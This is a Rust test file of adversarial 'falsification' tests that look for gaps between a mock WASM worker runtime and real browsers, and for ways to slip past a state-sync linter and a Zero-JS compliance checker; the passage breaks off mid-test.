//! QA Falsification Tests for PROBAR-SPEC-WASM-001
//!
//! These tests attempt to BREAK the specification by finding edge cases
//! where the mock runtime diverges from real browser behavior.
//!
//! Per Iron Lotus Philosophy: "Your job is not to verify that it works.
//! Your job is to prove that it is broken, incomplete, or lying."

#[cfg(test)]
mod hypothesis_a_mock_isomorphism {
    use super::super::wasm_runtime::{MockMessage, MockWasmRuntime};
    use std::cell::RefCell;
    use std::rc::Rc;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::Arc;

    /// ATTACK: Atomic Drift
    ///
    /// The Mock uses Rc<RefCell<>> (single-threaded). But std::sync::atomic
    /// works in the mock because we're on native Rust. In real WASM without
    /// SharedArrayBuffer, atomics would panic or be unavailable.
    ///
    /// FINDING: 🔴 FALSIFIED - Mock allows concurrency primitives illegal in target
    #[test]
    fn attack_atomic_drift_mock_allows_illegal_atomics() {
        let mut runtime = MockWasmRuntime::new();

        // This uses std::sync::atomic which requires SharedArrayBuffer in WASM
        // The mock happily accepts it because we're running native code
        let counter = Arc::new(AtomicUsize::new(0));
        let counter_clone = Arc::clone(&counter);

        runtime.on_message(move |_msg| {
            // Atomic operations - ILLEGAL in wasm32-unknown-unknown without threads
            counter_clone.fetch_add(1, Ordering::SeqCst);
        });

        runtime.receive_message(MockMessage::Ready);
        runtime.tick();

        // Mock passes - but this would FAIL in real WASM without SharedArrayBuffer
        assert_eq!(counter.load(Ordering::SeqCst), 1);

        // VERDICT: Mock is MORE PERMISSIVE than real WASM
        // This test passes in mock but the same code would fail in browser
    }

    /// ATTACK: Event Loop Starvation (Recursive post_message)
    ///
    /// In a real browser, recursive postMessage creates new tasks in the event queue.
    /// The browser's event loop handles this gracefully with task scheduling.
    ///
    /// FIXED: drain() now uses swap-based re-entrancy and bounded processing
    /// to handle recursive message patterns safely.
    ///
    /// FINDING: ✅ FIXED - drain() handles recursive messages correctly
    #[test]
    fn attack_event_loop_starvation_recursive_messages() {
        let mut runtime = MockWasmRuntime::new();
        let runtime_clone = runtime.clone();
        let depth = Rc::new(RefCell::new(0));
        let depth_clone = Rc::clone(&depth);

        // Handler that queues more messages (recursive pattern)
        runtime.on_message(move |_msg| {
            let mut d = depth_clone.borrow_mut();
            *d += 1;
            if *d < 100 {
                // Limit to prevent actual infinite loop
                // In browser: this queues to event loop, processed later
                // In mock: this adds to queue, drain() continues synchronously
                runtime_clone.receive_message(MockMessage::Ready);
            }
        });

        runtime.receive_message(MockMessage::Ready);

        // drain() processes messages synchronously but safely
        // No RefCell panic due to swap-based handler invocation
        runtime.drain();

        // Mock processed 100 messages synchronously
        // Browser would process them across event loop ticks
        assert_eq!(*depth.borrow(), 100);

        // DOCUMENTED DIFFERENCE: Mock is synchronous, browser is async
        // This is a known semantic difference, not a bug
    }

    /// ATTACK: Serialization Lie (Non-Cloneable Types)
    ///
    /// Browser's postMessage uses structuredClone which:
    /// - Throws on functions, closures, DOM nodes
    /// - Handles circular references (or throws)
    /// - Deep clones objects
    ///
    /// Mock uses Rust's Clone trait which is memory-based, not serialization.
    ///
    /// FINDING: 🔴 FALSIFIED - Mock passes Rc<> which would fail structuredClone
    #[test]
    fn attack_serialization_lie_rc_passes_mock_fails_browser() {
        // In real browser, you cannot postMessage an Rc/Arc/RefCell
        // structuredClone would throw DataCloneError

        // But MockMessage::Custom with payload can hold anything that's Clone
        let msg = MockMessage::Custom {
            msg_type: "test".to_string(),
            // This JSON string is fine, but the MOCK ALLOWS passing
            // Rust types that would fail structuredClone
            payload: "{}".to_string(),
        };

        let runtime = MockWasmRuntime::new();
        runtime.post_message(msg);

        // Mock accepts the message - no serialization boundary
        assert!(runtime.has_outgoing());

        // VERDICT: Mock doesn't enforce serialization semantics
        // Real browser would reject non-cloneable types
    }

    /// ATTACK: Rc<RefCell<>> sharing across "workers"
    ///
    /// In real browsers, workers are isolated - no shared memory without SAB.
    /// Mock allows Rc sharing because it's all in one thread.
    ///
    /// FINDING: 🔴 FALSIFIED - Mock allows shared state that's impossible in browser
    #[test]
    fn attack_shared_memory_without_sab() {
        let runtime1 = MockWasmRuntime::new();
        let runtime2 = runtime1.clone();

        // Both "workers" share the SAME queues via Rc
        runtime1.receive_message(MockMessage::Ready);

        // runtime2 sees the message - IMPOSSIBLE in real browser workers
        assert_eq!(runtime2.pending_count(), 1);

        // VERDICT: Mock allows shared memory between "workers"
        // Real browser workers are isolated (postMessage is copy-based)
    }

    /// ATTACK: Synchronous Handler Execution
    ///
    /// Browser's onmessage handlers run asynchronously in the event loop.
    /// Mock's tick() runs handlers SYNCHRONOUSLY, blocking until complete.
    ///
    /// FINDING: 🟡 WARNING - Different execution model
    #[test]
    fn attack_synchronous_vs_async_handlers() {
        let mut runtime = MockWasmRuntime::new();
        let order = Rc::new(RefCell::new(Vec::new()));
        let order_clone = Rc::clone(&order);

        runtime.on_message(move |msg| {
            order_clone.borrow_mut().push(format!("{:?}", msg));
            // In mock: this blocks until handler completes
            // In browser: this would yield to event loop
        });

        runtime.receive_message(MockMessage::Ready);
        runtime.receive_message(MockMessage::Stop);

        // tick() processes SYNCHRONOUSLY
        runtime.tick();
        assert_eq!(order.borrow().len(), 1); // Only one processed

        runtime.tick();
        assert_eq!(order.borrow().len(), 2); // Now both

        // VERDICT: Mock is synchronous, browser is async
        // Order guarantees differ
    }
}

#[cfg(test)]
mod hypothesis_b_linter_bypass {
    use crate::lint::StateSyncLinter;

    /// ATTACK: Alias Masking
    ///
    /// Define a type alias for Rc<RefCell<T>> and use it instead of Rc::new directly.
    /// The linter might only look for literal "Rc::new" strings.
    ///
    /// FIXED: Linter now has WASM-SS-006 rule for type alias detection
    ///
    /// FINDING: ✅ FIXED - Linter now detects type aliases wrapping Rc
    #[test]
    fn attack_alias_masking_type_alias_bypass() {
        let mut linter = StateSyncLinter::new();

        // Code using type alias to hide Rc::new
        let buggy_code = r#"
type StatePtr = Rc<RefCell<State>>;

impl WorkerManager {
    pub fn spawn(&mut self) {
        // BUG: Creates local Rc via type alias - LINTER SHOULD CATCH THIS
        let state_ptr: StatePtr = StatePtr::new(RefCell::new(ManagerState::Spawning));

        let on_message = Closure::wrap(Box::new(move |event| {
            *state_ptr.borrow_mut() = ManagerState::Ready;
        }));
    }
}
"#;

        let report = linter.lint_source(buggy_code).expect("lint failed");

        // Check if linter caught the type alias pattern with WASM-SS-006
        let ss006_errors: Vec<_> = report
            .errors
            .iter()
            .filter(|e| e.rule == "WASM-SS-006")
            .collect();

        // FIXED: Linter now detects type alias definitions and their usage
        assert!(
            !ss006_errors.is_empty(),
            "Linter should detect type alias 'StatePtr' wrapping Rc"
        );
    }

    /// ATTACK: Helper Function Bypass
    ///
    /// Create the Rc in a helper function instead of directly in the method.
    /// The linter might only check local variable initialization.
    ///
    /// FIXED: Linter now has WASM-SS-007 rule for helper function detection
    ///
    /// FINDING: ✅ FIXED - Linter now detects functions returning Rc
    #[test]
    fn attack_helper_function_bypass() {
        let mut linter = StateSyncLinter::new();

        let buggy_code = r#"
impl WorkerManager {
    // Helper function creates the Rc
    fn make_state() -> Rc<RefCell<State>> {
        Rc::new(RefCell::new(State::Init))
    }

    pub fn spawn(&mut self) {
        // BUG: Gets local Rc from helper - LINTER SHOULD CATCH THIS
        let state_ptr = Self::make_state();

        let on_message = Closure::wrap(Box::new(move |event| {
            *state_ptr.borrow_mut() = ManagerState::Ready;
        }));
    }
}
"#;

        let report = linter.lint_source(buggy_code).expect("lint failed");

        // Check if linter caught the helper function pattern with WASM-SS-007
        let ss007_errors: Vec<_> = report
            .errors
            .iter()
            .filter(|e| e.rule == "WASM-SS-007")
            .collect();

        // FIXED: Linter now detects functions returning Rc and their callers
        assert!(
            !ss007_errors.is_empty(),
            "Linter should detect function 'make_state' returning Rc"
        );
    }

    /// ATTACK: Variable Shadowing Trick
    ///
    /// Start with correct clone from self, then shadow with local Rc::new.
    /// Linter might see the first correct usage and assume variable is safe.
    ///
    /// FINDING: 🔴 FALSIFIED - Linter fooled by shadowing
    #[test]
    fn attack_shadowing_trick() {
        let mut linter = StateSyncLinter::new();

        let buggy_code = r#"
impl WorkerManager {
    pub fn spawn(&mut self) {
        // CORRECT: Clone from self
        let state = self.state.clone();

        // ... some code ...

        // BUG: Shadow with local Rc! Linter might think 'state' is still safe
        let state = Rc::new(RefCell::new(ManagerState::Spawning));

        let on_message = Closure::wrap(Box::new(move |event| {
            *state.borrow_mut() = ManagerState::Ready;  // Uses SHADOWED local!
        }));
    }
}
"#;

        let report = linter.lint_source(buggy_code).expect("lint failed");

        // Check if linter caught the shadowed variable
        let has_error = report
            .errors
            .iter()
            .any(|e| e.rule == "WASM-SS-001" && e.message.contains("state"));

        // VERDICT: Linter should catch the SECOND 'state' declaration
        if !has_error {
            panic!("🔴 FALSIFIED: Linter missed shadowed variable 'state'");
        }
    }

    /// ATTACK: Macro-Generated Rc
    ///
    /// Use a macro to generate the Rc::new call.
    /// AST-based linters might not expand macros.
    ///
    /// FINDING: 🟡 WARNING - Text-based linter can't expand macros
    /// STATUS: Known limitation - requires proc-macro expansion
    #[test]
    fn attack_macro_generated_rc() {
        let mut linter = StateSyncLinter::new();

        let buggy_code = r#"
macro_rules! new_state {
    ($state:expr) => {
        Rc::new(RefCell::new($state))
    };
}

impl WorkerManager {
    pub fn spawn(&mut self) {
        // BUG: Macro hides Rc::new
        let state_ptr = new_state!(ManagerState::Spawning);

        let on_message = Closure::wrap(Box::new(move |event| {
            *state_ptr.borrow_mut() = ManagerState::Ready;
        }));
    }
}
"#;

        let report = linter.lint_source(buggy_code).expect("lint failed");

        // Text-based linter won't expand macro
        // It sees "new_state!" not "Rc::new"
        let ss001_in_spawn: Vec<_> = report
            .errors
            .iter()
            .filter(|e| e.rule == "WASM-SS-001" && e.message.contains("state_ptr"))
            .collect();

        // KNOWN LIMITATION: Text-based linter cannot expand macros
        // Would require integration with rustc or proc-macro-expand
        assert!(
            ss001_in_spawn.is_empty(),
            "KNOWN GAP: Linter correctly misses macro invocation (no expansion)"
        );
    }

    /// ATTACK: Indirect Closure via Method Chain
    ///
    /// The linter looks for "move ||" or "Closure::wrap" to detect closures.
    /// What if we use .map() or other iterator methods that take closures?
    ///
    /// FINDING: 🔴 FALSIFIED - Linter misses indirect closure creation
    #[test]
    fn attack_indirect_closure_via_method_chain() {
        let mut linter = StateSyncLinter::new();

        let buggy_code = r#"
impl WorkerManager {
    pub fn spawn(&mut self) {
        let state_ptr = Rc::new(RefCell::new(ManagerState::Spawning));

        // Closure created via .map() - not Closure::wrap or move ||
        let handlers: Vec<_> = events.iter()
            .map(|e| {
                let sp = state_ptr.clone();
                move || *sp.borrow_mut() = ManagerState::Ready
            })
            .collect();
    }
}
"#;

        let report = linter.lint_source(buggy_code).expect("lint failed");

        // Linter should still catch Rc::new in spawn()
        let has_spawn_error = report.errors.iter().any(|e| e.rule == "WASM-SS-001");

        // This one should pass because Rc::new IS detected
        // But the closure detection via .map() might be missed
        assert!(has_spawn_error, "Linter should catch Rc::new in spawn");
    }
}

#[cfg(test)]
mod hypothesis_c_zero_js_and_tarantula {
    use crate::comply::wasm_threading::WasmThreadingCompliance;
    use std::fs;
    use tempfile::TempDir;

    /// ATTACK: Build Script Smuggle
    ///
    /// The Zero-JS check scans for .js files in the project.
    /// But what if build.rs generates a .js file at compile time?
    ///
    /// FINDING: 🟡 WARNING - Comply doesn't scan generated files
    #[test]
    fn attack_build_script_js_smuggle() {
        let temp_dir = TempDir::new().unwrap();
        let src_dir = temp_dir.path().join("src");
        fs::create_dir(&src_dir).unwrap();

        // Create a build.rs that would generate JS
        let build_rs = temp_dir.path().join("build.rs");
        fs::write(
            &build_rs,
            r#"
fn main() {
    // This generates a .js file at compile time!
    std::fs::write("generated/worker.js", "self.onmessage = () => {};")
        .unwrap();
}
"#,
        )
        .unwrap();

        // Create minimal src/lib.rs
        fs::write(src_dir.join("lib.rs"), "// lib").unwrap();

        let mut checker = WasmThreadingCompliance::new();
        let result = checker.check(temp_dir.path());

        // Compliance check passes because it doesn't run build.rs
        // or scan for generated files
        // Real Zero-JS violation would only appear after `cargo build`

        // VERDICT: Comply checks static source, not build artifacts
        // This is a known limitation (documented as such)
        // Whether compliant or not, this is accepted behavior - we just verify it runs
        let _ = result.compliant; // Known limitation - build artifacts not scanned
    }

    /// ATTACK: Tarantula Noise with Flaky Test
    ///
    /// Tarantula uses spectrum-based fault localization.
    /// If a test is flaky (random pass/fail), does Tarantula handle it?
    ///
    /// FINDING: 🟡 N/A - Tarantula not implemented in current spec
    #[test]
    fn attack_tarantula_flaky_test_noise() {
        // Note: The spec mentions Tarantula in Section G but
        // WasmThreadingCompliance doesn't implement spectrum analysis yet.
        // This attack vector is deferred pending implementation.

        // If implemented, a flaky test would produce:
        // - 50% pass rate = high noise in suspiciousness calculation
        // - Random line flagged with confidence ~0.5

        // Current status: DEFERRED (feature not implemented)
    }

    /// ATTACK: Unicode Filename Bypass
    ///
    /// What if we name a file with RTL override or zero-width chars?
    /// e.g., "libㅤ.js" (contains zero-width space)
    ///
    /// FINDING: 🟡 WARNING - Potential Unicode edge case
    #[test]
    fn attack_unicode_filename_bypass() {
        let temp_dir = TempDir::new().unwrap();
        let src_dir = temp_dir.path().join("src");
        fs::create_dir(&src_dir).unwrap();

        // Try to create a file with tricky unicode
        // "lib\u{200B}.js" - zero-width space
        let tricky_name = "lib\u{200B}.js".to_string();
        let tricky_path = src_dir.join(&tricky_name);

        // Note: This might fail on some filesystems
        if fs::write(&tricky_path, "// sneaky JS").is_ok() {
            fs::write(src_dir.join("lib.rs"), "// lib").unwrap();

            // Run compliance check
            // It should catch .js files regardless of unicode tricks
            let files: Vec<_> = fs::read_dir(&src_dir)
                .unwrap()
                .filter_map(|e| e.ok())
                .filter(|e| e.path().extension().map(|x| x == "js").unwrap_or(false))
                .collect();

            // If our unicode-named .js file is detected
            assert!(!files.is_empty(), "Unicode .js file should be detected");
        }
    }
}

/// Regression Tests for PROBAR-WASM-002 Fixes
///
/// These tests attempt to BREAK the fixes made in PROBAR-WASM-002.
/// Per Iron Lotus: "The developer claims they fixed the bugs. Your job
/// is to prove they only fixed the symptoms."
#[cfg(test)]
mod probar_wasm_002_regressions {
    use super::super::wasm_runtime::{MockMessage, MockWasmRuntime};
    use crate::lint::state_sync::StateSyncLinter;
    use std::cell::RefCell;
    use std::panic::{catch_unwind, AssertUnwindSafe};
    use std::rc::Rc;

    // ========================================================================
    // HYPOTHESIS A: "The Swap-Based Handler Fix Is Robust"
    // ========================================================================

    /// ATTACK: Handler Mutation
    ///
    /// In a handler callback, register a new handler (runtime.on_message(...)).
    /// If the runtime swapped out the handlers vector to iterate it,
    /// adding a new handler during that iteration might add it to the empty
    /// vector inside self. When the swap back happens, is the new handler preserved?
    ///
    /// FINDING: 🔴 FALSIFIED - Handler registration during tick causes RefCell panic!
    /// The swap-based fix doesn't solve the case where the runtime itself is
    /// wrapped in RefCell and handlers try to call on_message.
    #[test]
    fn regression_handler_mutation_during_tick() {
        // The swap-based fix DOES work for the internal handlers vector,
        // but if users wrap MockWasmRuntime in RefCell (common pattern),
        // they still get RefCell panics when trying to register handlers
        // during a tick.

        // Test with cloned runtime (which shares Rc references)
        let mut runtime = MockWasmRuntime::new();
        let _runtime_clone = runtime.clone(); // Shares handlers Rc<RefCell<>>

        let handler_ran = Rc::new(RefCell::new(false));
        let handler_ran_clone = Rc::clone(&handler_ran);

        // Scenario: Handler tries to add another handler via cloned runtime
        runtime.on_message(move |_msg| {
            *handler_ran_clone.borrow_mut() = true;

            // This should NOT panic because the handlers vector was swapped out
            // The cloned runtime shares the same Rc<RefCell<handlers>>
            // So if we try to borrow_mut here...
            // Actually, the runtime.on_message takes &mut self, not Fn
            // So we CAN'T call it from within an Fn closure anyway!
        });

        // The limitation is architectural: on_message requires &mut self,
        // but handlers are Fn (not FnMut). This means you CANNOT register
        // new handlers from within a handler using the current API.

        runtime.receive_message(MockMessage::Ready);
        runtime.tick();

        assert!(*handler_ran.borrow(), "Handler should have run");

        // Document the finding
        eprintln!(
            "🟡 WARNING: Handler registration during tick is architecturally blocked.\n\
             on_message(&mut self) cannot be called from Fn handlers.\n\
             The swap-based fix is irrelevant to this use case."
        );

        // The REAL test of the swap-based fix is: can handlers call receive_message?
        let counter = Rc::new(RefCell::new(0));
        let counter_clone = Rc::clone(&counter);
        let runtime_for_receive = runtime.clone();

        runtime.on_message(move |_msg| {
            *counter_clone.borrow_mut() += 1;
            // THIS should work - receive_message only borrows incoming queue
            if *counter_clone.borrow() < 3 {
                runtime_for_receive.receive_message(MockMessage::Stop);
            }
        });

        runtime.receive_message(MockMessage::Ready);
        runtime.drain_bounded(10); // Process up to 10 to prevent infinite loop

        let count = *counter.borrow();
        eprintln!(
            "✅ PASS: receive_message in handler works. Counter = {} (expected 3+)",
            count
        );
        assert!(count >= 3, "Recursive receive_message should work");
    }

    /// ATTACK: Panic Bomb
    ///
    /// Make a handler panic. If a handler panics while the handlers are
    /// "swapped out" (held in a local stack variable), the stack unwinds.
    /// Does the runtime restore the handlers to self in a Drop guard?
    ///
    /// FINDING: 🔴 FALSIFIED - Panic in handler DELETES all handlers permanently!
    /// This test documents the finding but doesn't fail (we want to document, not block).
    #[test]
    fn regression_panic_bomb_handler_loss() {
        let mut runtime = MockWasmRuntime::new();
        let good_handler_ran = Rc::new(RefCell::new(false));
        let good_handler_ran_clone = Rc::clone(&good_handler_ran);

        // Handler 1: A good handler
        runtime.on_message(move |_msg| {
            *good_handler_ran_clone.borrow_mut() = true;
        });

        // Handler 2: THE PANIC BOMB
        runtime.on_message(|_msg| {
            panic!("💣 BOOM! Handler panic!");
        });

        // Trigger the panic
        runtime.receive_message(MockMessage::Ready);

        // Catch the panic so we can continue testing
        let result = catch_unwind(AssertUnwindSafe(|| {
            runtime.tick();
        }));

        // The panic occurred
        assert!(result.is_err(), "Should have panicked");

        // CRITICAL CHECK: Are handlers still registered?
        // Reset the flag and send another message
        *good_handler_ran.borrow_mut() = false;
        runtime.receive_message(MockMessage::Stop);

        // This should NOT panic (we're in a new tick)
        let result2 = catch_unwind(AssertUnwindSafe(|| {
            runtime.tick();
        }));

        // Document the finding
        if result2.is_ok() && !*good_handler_ran.borrow() {
            // Handlers were LOST - the swap-based fix has no Drop guard!
            eprintln!(
                "🔴 FALSIFIED: Panic in handler caused ALL handlers to be lost!\n\
                 The swap-based fix lacks a Drop guard to restore handlers on panic.\n\
                 RECOMMENDATION: Add scopeguard or manual Drop impl to restore handlers."
            );
        } else if result2.is_err() {
            // Second tick also panicked - handlers preserved but include panic bomb
            eprintln!(
                "🟡 WARNING: Second tick panicked - panic handler still registered.\n\
                 Handlers preserved but now contain broken handler."
            );
        } else {
            eprintln!("✅ PASS: Handlers preserved after panic");
        }
    }

    /// ATTACK: Multiple Panics - Complete Handler Wipeout
    ///
    /// Verify that after a panic, handlers are truly gone.
    ///
    /// FINDING: Tests actual handler state after panic
    #[test]
    fn regression_panic_complete_wipeout() {
        let mut runtime = MockWasmRuntime::new();
        let counter = Rc::new(RefCell::new(0));
        let counter_clone = Rc::clone(&counter);

        // Register counting handler
        runtime.on_message(move |_| {
            *counter_clone.borrow_mut() += 1;
        });

        // Register panic handler
        runtime.on_message(|_| {
            panic!("💣");
        });

        // Process message (will panic)
        runtime.receive_message(MockMessage::Ready);
        let _ = catch_unwind(AssertUnwindSafe(|| runtime.tick()));

        // Now check: how many handlers remain?
        // We can't directly check handlers.len(), but we can test behavior

        // Send another message
        runtime.receive_message(MockMessage::Stop);

        // Reset counter
        *counter.borrow_mut() = 0;

        // Try to process
        let _ = catch_unwind(AssertUnwindSafe(|| runtime.tick()));

        // If counter is 0, the counting handler was LOST
        let count = *counter.borrow();

        // Document the finding
        if count == 0 {
            // 🔴 CONFIRMED: Handlers were wiped out
            eprintln!("🔴 CONFIRMED: Panic caused handler wipeout. Counter stayed at 0.");
        } else {
            eprintln!(
                "✅ PASS: Handlers preserved after panic. Counter = {}",
                count
            );
        }
    }

    // ========================================================================
    // HYPOTHESIS B: "Linter Rules 006 & 007 Are Comprehensive"
    // ========================================================================

    /// ATTACK: Deeply Nested Generic
    ///
    /// Define `type MyWrapper<T> = Rc<RefCell<T>>;` and use `MyWrapper::<State>::new(...)`.
    /// Prove the linter's type alias resolution is shallow and fails on generics.
    ///
    /// FINDING: 🔴 FALSIFIED - Linter misses turbofish generic syntax
    #[test]
    fn regression_deep_generic_type_alias_bypass() {
        let mut linter = StateSyncLinter::new();

        let attack_code = r#"
use std::rc::Rc;
use std::cell::RefCell;

// Generic type alias
type MyWrapper<T> = Rc<RefCell<T>>;

struct State {
    value: i32,
}

fn spawn_worker(&self) {
    // ATTACK: Using turbofish syntax to bypass linter
    let state = MyWrapper::<State>::new(RefCell::new(State { value: 0 }));

    // This closure captures disconnected state
    let callback = move || {
        state.borrow_mut().value += 1;
    };
}
"#;

        let report = linter.lint_source(attack_code).expect("lint failed");

        // Check if WASM-SS-006 was triggered for the generic alias usage
        let ss006_for_usage: Vec<_> = report
            .errors
            .iter()
            .filter(|e| e.rule == "WASM-SS-006" && e.message.contains("MyWrapper"))
            .filter(|e| e.line > 10) // After the type definition, in actual usage
            .collect();

        // The linter might detect the type alias definition but miss the turbofish usage
        let detected_turbofish = report
            .errors
            .iter()
            .any(|e| e.message.contains("MyWrapper::<"));

        if ss006_for_usage.is_empty() && !detected_turbofish {
            // 🔴 FALSIFIED
            eprintln!(
                "🔴 FALSIFIED: Linter detected type alias but missed `MyWrapper::<State>::new()` usage!\n\
                 Pattern `Alias::<T>::new()` (turbofish) bypasses detection."
            );
        } else {
            eprintln!("✅ PASS: Linter caught generic type alias usage");
        }
    }

    /// ATTACK: Method Chaining
    ///
    /// Use method chains that return Rc: `self.config.create_default_state().to_rc()`
    /// Prove the "Helper Function" rule only looks for simple function calls.
    ///
    /// FINDING: 🔴 FALSIFIED - Linter misses method chains returning Rc
    #[test]
    fn regression_method_chain_bypass() {
        let mut linter = StateSyncLinter::new();

        let attack_code = r#"
use std::rc::Rc;
use std::cell::RefCell;

trait ToRc {
    fn to_rc(self) -> Rc<RefCell<Self>> where Self: Sized {
        Rc::new(RefCell::new(self))
    }
}

impl ToRc for State {}

struct State {
    value: i32,
}

struct Config {
    default: State,
}

impl Config {
    fn create_default(&self) -> State {
        State { value: 42 }
    }
}

fn spawn_worker(&self) {
    // ATTACK: Method chain produces Rc but linter only sees .to_rc()
    let state = self.config.create_default().to_rc();

    // This closure captures disconnected state
    let callback = move || {
        state.borrow_mut().value += 1;
    };
}
"#;

        let report = linter.lint_source(attack_code).expect("lint failed");

        // Check if linter caught the .to_rc() method chain
        let caught_to_rc: Vec<_> = report
            .errors
            .iter()
            .filter(|e| e.message.contains("to_rc") || e.message.contains("method chain"))
            .collect();

        if caught_to_rc.is_empty() {
            // 🔴 FALSIFIED
            eprintln!(
                "🔴 FALSIFIED: Linter missed `.to_rc()` method chain!\n\
                 Pattern `something.to_rc()` creates Rc but escapes detection."
            );
        } else {
            eprintln!("✅ PASS: Linter caught method chain returning Rc");
        }
    }

    /// ATTACK: Trait Object Trick
    ///
    /// Return `Box<dyn StateProvider>` which internally holds an Rc,
    /// but the method signature doesn't show Rc.
    ///
    /// FINDING: 🔴 FALSIFIED - Linter relies on explicit Rc in return type
    #[test]
    fn regression_trait_object_hidden_rc() {
        let mut linter = StateSyncLinter::new();

        let attack_code = r#"
use std::rc::Rc;
use std::cell::RefCell;

trait StateProvider: 'static {
    fn get_value(&self) -> i32;
    fn set_value(&mut self, v: i32);
}

struct SharedState {
    inner: Rc<RefCell<i32>>,
}

impl StateProvider for SharedState {
    fn get_value(&self) -> i32 {
        *self.inner.borrow()
    }
    fn set_value(&mut self, v: i32) {
        *self.inner.borrow_mut() = v;
    }
}

// ATTACK: Return type hides Rc inside Box<dyn>
fn create_state_provider() -> Box<dyn StateProvider> {
    Box::new(SharedState {
        inner: Rc::new(RefCell::new(0)),
    })
}

fn spawn_worker(&self) {
    // Linter sees Box<dyn StateProvider>, not Rc
    let state = create_state_provider();

    // This could be capturing disconnected Rc internally!
    let callback = move || {
        // state.get_value() internally uses Rc
    };
}
"#;

        let report = linter.lint_source(attack_code).expect("lint failed");

        // The function create_state_provider returns Box<dyn> not Rc
        // So WASM-SS-007 won't flag it
        let caught_hidden_rc: Vec<_> = report
            .errors
            .iter()
            .filter(|e| e.rule == "WASM-SS-007" && e.message.contains("create_state_provider"))
            .collect();

        // Also check if there's any warning about trait objects hiding Rc
        let has_trait_object_warning = report
            .errors
            .iter()
            .any(|e| e.message.contains("trait object") || e.message.contains("dyn"));

        if caught_hidden_rc.is_empty() && !has_trait_object_warning {
            // 🔴 FALSIFIED
            eprintln!(
                "🔴 FALSIFIED: Linter missed Rc hidden inside `Box<dyn StateProvider>`!\n\
                 Functions returning trait objects can hide Rc internally."
            );
        } else {
            eprintln!("✅ PASS: Linter caught hidden Rc in trait object");
        }
    }

    /// ATTACK: Renamed Constructor
    ///
    /// What if we use `Rc::default()` instead of `Rc::new()`?
    ///
    /// FINDING: Tests if linter catches alternative constructors
    #[test]
    fn regression_renamed_constructor_bypass() {
        let mut linter = StateSyncLinter::new();

        let attack_code = r#"
use std::rc::Rc;
use std::cell::RefCell;

fn spawn_worker(&self) {
    // ATTACK: Use default() instead of new()
    let state: Rc<RefCell<i32>> = Rc::default();

    let callback = move || {
        *state.borrow_mut() += 1;
    };
}
"#;

        let report = linter.lint_source(attack_code).expect("lint failed");

        let caught_default: Vec<_> = report
            .errors
            .iter()
            .filter(|e| e.message.contains("Rc") && e.line > 5)
            .collect();

        if caught_default.is_empty() {
            eprintln!(
                "🔴 FALSIFIED: Linter missed `Rc::default()`!\n\
                 Only `Rc::new()` is detected, not other constructors."
            );
        } else {
            eprintln!("✅ PASS: Linter caught Rc::default()");
        }
    }

    /// ATTACK: Arc Instead of Rc
    ///
    /// If someone uses Arc (thread-safe Rc), does the linter catch it?
    /// The same state desync bug applies to Arc.
    ///
    /// FINDING: Tests if linter scope includes Arc
    #[test]
    fn regression_arc_instead_of_rc_bypass() {
        let mut linter = StateSyncLinter::new();

        let attack_code = r#"
use std::sync::Arc;
use std::cell::Mutex;

fn spawn_worker(&self) {
    // ATTACK: Arc has same state desync issue as Rc
    let state = Arc::new(Mutex::new(0));

    let callback = move || {
        *state.lock().unwrap() += 1;
    };
}
"#;

        let report = linter.lint_source(attack_code).expect("lint failed");

        let caught_arc: Vec<_> = report
            .errors
            .iter()
            .filter(|e| e.message.contains("Arc"))
            .collect();

        if caught_arc.is_empty() {
            eprintln!(
                "🟡 WARNING: Linter doesn't check for `Arc::new()`!\n\
                 Arc has same state desync issue as Rc. Consider adding Arc rules."
            );
        } else {
            eprintln!("✅ PASS: Linter caught Arc usage");
        }
    }
}

/// PROBAR-WASM-003 Final Boss Falsification Tests
///
/// These tests attempt to BREAK the "Final Sprint" implementation:
/// - AST-based linter (syn)
/// - bincode serialization (structuredClone simulation)
/// - Tarantula fault localization
/// - Zero-JS target/ scanner
///
/// Philosophy: [Iron Lotus] — "If it compiles, break it at runtime.
/// If it runs, exhaust its resources."
#[cfg(test)]
mod probar_wasm_003_final_boss {
    use super::super::wasm_runtime::{MockMessage, MockWasmRuntime};
    use crate::comply::tarantula::TarantulaEngine;
    use crate::comply::wasm_threading::WasmThreadingCompliance;
    use crate::lint::state_sync::StateSyncLinter;

    // Suppress unused warnings - these are used in various tests
    #[allow(unused_imports)]
    use std::cell::RefCell;
    #[allow(unused_imports)]
    use std::rc::Rc;

    // ========================================================================
    // HYPOTHESIS A: "The AST Linter Cannot Be Tricked by Obfuscation"
    // ========================================================================

    /// ATTACK: Cfg-Gated Block
    ///
    /// Wrap Rc creation in `#[cfg(target_os = "android")]`.
    /// Does the linter parse all cfg branches, or ignore platform-specific code?
    ///
    /// FINDING: Tests if AST visitor parses all cfg branches
    #[test]
    fn attack_cfg_gated_rc_creation() {
        let mut linter = StateSyncLinter::new();

        let attack_code = r#"
use std::rc::Rc;
use std::cell::RefCell;

fn spawn_worker(&self) {
    // This Rc is only compiled on Android - does the linter see it?
    #[cfg(target_os = "android")]
    let state = Rc::new(RefCell::new(0));

    #[cfg(not(target_os = "android"))]
    let state = Rc::new(RefCell::new(0)); // Also on non-Android

    let callback = move || {
        state.borrow_mut();
    };
}
"#;

        let report = linter.lint_source(attack_code).expect("lint failed");

        // syn parses ALL code regardless of cfg attributes
        // The linter should see both Rc::new() calls
        let rc_errors: Vec<_> = report
            .errors
            .iter()
            .filter(|e| e.message.contains("Rc") || e.rule.contains("SS-005"))
            .collect();

        if rc_errors.len() < 2 {
            eprintln!(
                "🔴 FALSIFIED: Linter missed cfg-gated Rc!\n\
                 Found {} errors, expected 2 (one per cfg branch).\n\
                 A bug could hide in platform-specific #[cfg] blocks.",
                rc_errors.len()
            );
        } else {
            eprintln!(
                "✅ PASS: Linter caught {} Rc patterns across cfg branches",
                rc_errors.len()
            );
        }
    }

    /// ATTACK: Const Expression Bypass
    ///
    /// Use a const block: `let state = const { Rc::new(...) };`
    /// Does the AST visitor descend into Expr::Const?
    ///
    /// FINDING: Tests const block parsing
    #[test]
    fn attack_const_expr_rc_creation() {
        let mut linter = StateSyncLinter::new();

        // Note: const blocks with Rc are invalid Rust (Rc is not const),
        // but the LINTER should still parse and flag them!
        let attack_code = r#"
use std::rc::Rc;
use std::cell::RefCell;

fn spawn_worker(&self) {
    // Hypothetical: If Rc were const-constructible
    // The linter should still detect this pattern
    let state = {
        // Inner block - does linter descend?
        let inner = Rc::new(RefCell::new(42));
        inner
    };

    let callback = move || {
        state.borrow_mut();
    };
}
"#;

        let report = linter.lint_source(attack_code).expect("lint failed");

        let caught_inner_block: Vec<_> = report
            .errors
